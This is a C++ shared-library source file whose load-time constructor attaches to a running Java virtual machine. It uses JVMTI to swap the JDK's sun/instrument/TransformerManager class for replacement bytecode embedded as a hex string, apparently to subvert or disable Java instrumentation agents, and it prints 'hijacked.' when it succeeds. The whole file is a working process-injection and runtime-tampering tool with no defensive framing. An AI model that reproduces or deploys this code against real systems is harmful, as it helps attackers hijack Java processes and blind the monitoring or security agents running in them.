#include <iostream>
#include <jni.h>
#include <stdio.h>
#include <dlfcn.h>
#include "jvmti.h"
#include <pthread.h>


const char* targetClassHex = "cafebabe0000003d007f0a000200030700040c000500060100106a6176612f6c616e672f4f626a6563740100063c696e69743e01000328295607000801003173756e2f696e737472756d656e742f5472616e73666f726d65724d616e61676572245472616e73666f726d6572496e666f09000a000b07000c0c000d000e01002173756e2f696e737472756d656e742f5472616e73666f726d65724d616e616765720100106d5472616e73666f726d65724c6973740100345b4c73756e2f696e737472756d656e742f5472616e73666f726d65724d616e61676572245472616e73666f726d6572496e666f3b09000a00100c001100120100126d497352657472616e73666f726d61626c650100015a0a001400150700160c001700180100106a6176612f6c616e672f53797374656d0100096172726179636f707901002a284c6a6176612f6c616e672f4f626a6563743b494c6a6176612f6c616e672f4f626a6563743b494929560a0007001a0c0005001b010051284c73756e2f696e737472756d656e742f5472616e73666f726d65724d616e616765723b4c6a6176612f6c616e672f696e737472756d656e742f436c61737346696c655472616e73666f726d65723b29560a0007001d0c001e001f01000b7472616e73666f726d657201002d28294c6a6176612f6c616e672f696e737472756d656e742f436c61737346696c655472616e73666f726d65723b0a000a00210c0022002301001a676574536e617073686f745472616e73666f726d65724c69737401003628295b4c73756e2f696e737472756d656e742f5472616e73666f726d65724d616e61676572245472616e73666f726d6572496e666f3b0b002500260700270c002800290100296a6176612f6c616e672f696e737472756d656e742f436c61737346696c655472616e73666f726d65720100097472616e73666f726d010072284c6a6176612f6c616e672f4d6f64756c653b4c6a6176612f6c616e672f436c6173734c6f616465723b4c6a6176612f6c616e672f537472696e673b4c6a6176612f6c616e672f436c6173733b4c6a6176612f73656375726974792f50726f74656374696f6e446f6d61696e3b5b42295b4207002b0100136a6176612f6c616e672f5468726f7761626c650a0007002d0c002e002f010009736574507265666978010015284c6a6176612f6c616e672f537472696e673b29560700310100106a6176612f6c616e672f537472696e670a000700330c0034003501000967657450726566697801001428294c6a6176612f6c616e672f537472696e673b010004285a2956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c65010004746869730100234c73756e2f696e737472756d656e742f5472616e73666f726d65724d616e616765723b010011697352657472616e73666f726d61626c6501000328295a01000e6164645472616e73666f726d657201002e284c6a6176612f6c616e672f696e737472756d656e742f436c61737346696c655472616e73666f726d65723b295601002b4c6a6176612f6c616e672f696e737472756d656e742f436c61737346696c655472616e73666f726d65723b0100076f6c644c6973740100076e65774c69737401001172656d6f76655472616e73666f726d657201002e284c6a6176612f6c616e672f696e737472756d656e742f436c61737346696c655472616e73666f726d65723b295a0100017801000149010005666f756e640100096f6c644c656e6774680100096e65774c656e67746801000d6d61746368696e67496e64657801000d537461636b4d61705461626c6507000e010013696e636c756465735472616e73666f726d6572010004696e666f0100334c73756e2f696e737472756d656e742f5472616e73666f726d65724d616e61676572245472616e73666f726d6572496e666f3b01000f7472616e73666f726d6572496e666f0100107472616e73666f726d656442797465730100025b42010006726573756c740100066d6f64756c650100124c6a6176612f6c616e672f4d6f64756c653b0100066c6f616465720100174c6a6176612f6c616e672f436c6173734c6f616465723b010009636c6173736e616d650100124c6a6176612f6c616e672f537472696e673b010013636c6173734265696e675265646566696e65640100114c6a6176612f6c616e672f436c6173733b01001070726f74656374696f6e446f6d61696e0100204c6a6176612f73656375726974792f50726f74656374696f6e446f6d61696e3b01000f636c61737366696c65427566666572010019736f6d656f6e65546f756368656454686542797465636f646501000f7472616e73666f726d65724c69737401000b627566666572546f5573650100164c6f63616c5661726961626c65547970655461626c650100144c6a6176612f6c616e672f436c6173733c2a3e3b0700650100106a6176612f6c616e672f4d6f64756c650700670100156a6176612f6c616e672f436c6173734c6f6164657207006901000f6a6176612f6c616e672f436c61737307006b01001e6a6176612f73656375726974792f50726f74656374696f6e446f6d61696e0700520100095369676e6174757265010075284c6a6176612f6c616e672f4d6f64756c653b4c6a6176612f6c616e672f436c6173734c6f616465723b4c6a6176612f6c616e672f537472696e673b4c6a6176612f6c616e672f436c6173733c2a3e3b4c6a6176612f73656375726974792f50726f74656374696f6e446f6d61696e3b5b42295b420100136765745472616e73666f726d6572436f756e740100032829490100157365744e61746976654d6574686f64507265666978010040284c6a6176612f6c616e672f696e737472756d656e742f436c61737346696c655472616e73666f726d65723b4c6a6176612f6c616e672f537472696e673b295a01000c615472616e73666f726d65720100067072656669780100176765744e61746976654d6574686f64507265666978657301001528295b4c6a6176612f6c616e672f537472696e673b01000870726566697865730100135b4c6a6176612f6c616e672f537472696e673b07007801000a536f7572636546696c650100175472616e73666f726d65724d616e616765722e6a61766101000b4e6573744d656d6265727301000c496e6e6572436c617373657301000f5472616e73666f726d6572496e666f0021000a0002000000020002000d000e00000002001100120000000a000000050036000100370000005200020002000000122ab700012a03bd0007b500092a1bb5000fb10000000200380000001200040000005300040054000c005500110056003900000016000200000012003a003b000000000012003c001200010000003c003d000100370000002f00010001000000052ab4000fac0000000200380000000600010000005900390000000c000100000005003a003b00000021003e003f000100370000008500060004000000292ab400094d2cbe0460bd00074e2c032d032cbeb800132d2cbebb0007592a2bb70019532a2db50009b10000000200380000001a00060000005e0005005f000d006000160065002300660028006700390000002a000400000029003a003b000000000029001e00400001000500240041000e0002000d001c0042000e0003002100430044000100370000016f0006000800000073033d2ab400094e2dbe360415040464360503360615040464360715079b001d2d150732b6001c2ba6000c043d15073606a700098407ffa7ffe41c9900371505bd00073a0715069e000d2d031907031506b8001315061505a200142d15060460190715061505150664b800132a1907b500091cac00000003004b000000340006ff001a000807000a0700250107004c0101010100001805ff0019000807000a0700250107004c01010107004c000017fa000500380000004e00130000006b0002006c0007006d000b006e0011007200140073001f0074002a0075002c007600300077003300730039007c003d007d004400800049008100530089005a008a006b00900071009200390000005c0009001a001f0045004600070044002d0042000e000700000073003a003b000000000073001e00400001000200710047001200020007006c0041000e0003000b0068004800460004001100620049004600050014005f004a004600060020004d00440001003700000091000200060000002a2ab400094d2cbe3e03360415041da2001a2c1504323a051905b6001c2ba6000504ac840401a7ffe603ac00000003004b000000130003fe000b07004c0101fc0016070007fa00050038000000160005000000970017009800200099002200970028009c00390000002000030017000b004e004f00050000002a003a003b00000000002a001e00400001000200220023000100370000002f00010001000000052ab40009b0000000020038000000060001000000a500390000000c000100000005003a003b000000010028002900020037000001db0001000f000000671906b00000bf0000000000bf000000bf0000bf00000000000000bf000000000000bf000000000000bf0000bf0000000000000000000000000000000000bf0000bf00bf00000000bf0000bf000000bf0000000000bf00000000bf000000bf0000bf0000bf0000bf00000004004b000000580014ff00030000000107002a4207002a4507002a4307002a4207002a4707002a4607002a4607002a4207002a5107002a4207002a4107002a4407002a4207002a4307002a4507002a4407002a4307002a4207002a4207002a00380000004a0012000300af000600b1000c00b3001000b6001b00b7002200b8002900b9002c00bc003e00c6004100c3004300c8004800c9004b00ca004f00b6005500d1005a00d2006100d5006400d80039000000a200100022002d0050004f000b00290026001e0040000c002c002300510052000d0013004200450046000a005e000300530052000a00030064003a003b000000030064005400550001000300640056005700020003006400580059000300030064005a005b000400030064005c005d000500030064005e0052000600060061005f00120007000c005b0060000e0008001000570061005200090064000300530052000a00620000000c000100030064005a00630004006d00000002006e0000006f0070000100370000004000010002000000082ab600204c2bbeac0000000200380000000a0002000000de000500df003900000016000200000008003a003b0000000500030060000e000100000071007200010037000000d300020007000000322ab600204e03360415042dbea200242d1504323a051905b6001c3a0619062ba6000b19052cb6002c04ac840401a7ffdb03ac00000003004b000000150003fd000807004c01fd0021070007070025f900050038000000260009000000e4000500e6000f00e7001500e8001c00ea002200eb002800ec002a00e6003000ef0039000000480007001500150050004f0005001c000e0073004000060008002800450046000400000032003a003b000000000032001e00400001000000320074005900020005002d0060000e000300000075007600010037000000a500030005000000282ab600204c2bbebd00304d033e1d2bbea200162b1d323a042c1d1904b6003253840301a7ffea2cb000000003004b0000000d0002fe000d07004c070079011800380000001e0007000000f5000500f6000b00f8001300f9001800fa002000f8002600fc0039000000340005001800080050004f0004000d001900450046000300000028003a003b0000000500230060000e0001000b001d0077007800020003007d0000000a00010007000a007e0002007a00000002007b007c0000000400010007";
const char* targetClassName = "sun/instrument/TransformerManager";


unsigned char hexToByte(const char* hex) {
    unsigned int byte;
    sscanf(hex, "%02x", &byte);
    return (unsigned char)byte;
}

void hexStringToByteArray(const char* hexString, unsigned char* byteArray, int byteArrayLength) {
    for (int i = 0; i < byteArrayLength; i++) {
        byteArray[i] = hexToByte(hexString + 2 * i);
    }
}

void* library_init(void* arg);

static void __attribute__((constructor))
init() {
    pthread_t tid;
    int err = pthread_create(&tid, NULL, &library_init, NULL);
    if (err != 0) {
        std::cerr << "Failed to create a thread: " << strerror(err) << std::endl;
    }
}

void* library_init(void* arg) {
    JavaVM *vmBuf[1];
    jsize numVMs;
    jvmtiEnv *jvmti;

    jint result = JNI_GetCreatedJavaVMs(vmBuf, 1, &numVMs);

    std::cout << "Number of JVMs found: " << numVMs << std::endl;

    if (result == JNI_OK && numVMs > 0) {
        JavaVM *jvm = vmBuf[0]; // assume one JVM is there
        JNIEnv *env;



        // length of the class bytecode ->  create a byte array
        int length = strlen(targetClassHex) / 2;
        unsigned char classBytes[length];
        hexStringToByteArray(targetClassHex, classBytes, length);

        // try to attach to the JVM
        jint attachResult = jvm->AttachCurrentThread(reinterpret_cast<void **>(&env), nullptr);

        if (attachResult == JNI_OK) {
            printf("JVM attached yay\n");
            jvm->GetEnv((void **) &jvmti, JVMTI_VERSION_1_1);
            jvmtiCapabilities capabilities;
            memset(&capabilities, 0, sizeof(capabilities));
            capabilities.can_redefine_classes = 1; // enabling class redefinition capability

            jvmti->AddCapabilities(&capabilities);

            jclass myClass = env->FindClass(targetClassName);
            if (myClass == nullptr) {
                std::cerr << "Failed to find the class." << std::endl;
                jvm->DetachCurrentThread();
            }

            //class definition structure for redefinition
            jvmtiClassDefinition classDef;
            classDef.klass = myClass;
            classDef.class_byte_count = length;
            classDef.class_bytes = classBytes;

            // if we are here then the jvm is hijacked
            std::cerr << "hijacked. " << std::endl;
            jvmtiError err = jvmti->RedefineClasses(1, &classDef);
            if (err != JVMTI_ERROR_NONE) {
                char *errName = nullptr;
                jvmti->GetErrorName(err, &errName);
                std::cerr << "Failed to redefine the class. JVMTI Error Code: " << err;
                if (errName != nullptr) {
                    std::cerr << " (" << errName << ")";
                    jvmti->Deallocate((unsigned char *) errName);
                }
                std::cerr << std::endl;
            }
            jvm->DetachCurrentThread();
        } else {
            std::cerr << "Failed to attach thread to JVM. Error code: " << attachResult << std::endl;
            switch (attachResult) {
                case JNI_EDETACHED:
                    std::cerr << "Thread not attached to the JVM." << std::endl;
                    break;
                case JNI_EVERSION:
                    std::cerr << "JVM version error." << std::endl;
                    break;
                default:
                    std::cerr << "Unknown error occurred." << std::endl;
            }
        }
    } else {
        std::cerr << "No JVMs found :/" << std::endl;
    }
}
